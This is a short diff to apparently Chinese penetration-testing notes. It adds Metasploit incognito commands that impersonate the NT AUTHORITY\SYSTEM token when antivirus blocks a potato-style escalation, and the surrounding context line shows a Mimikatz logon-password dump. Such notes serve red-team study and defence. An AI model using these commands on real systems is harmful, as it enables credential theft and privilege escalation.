@@ -151,6 +151,13 @@ kiwi_cmd sekurlsa::logonPasswords
 
 ```
 
+遇到杀软，无法甜土豆提权，可msf获得会话后假冒令牌提权
+```css
+load incognito
+list_tokens -u
+impersonate_token "NT AUTHORITY\SYSTEM"
+getuid
+```
 参考链接
 [使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)
 
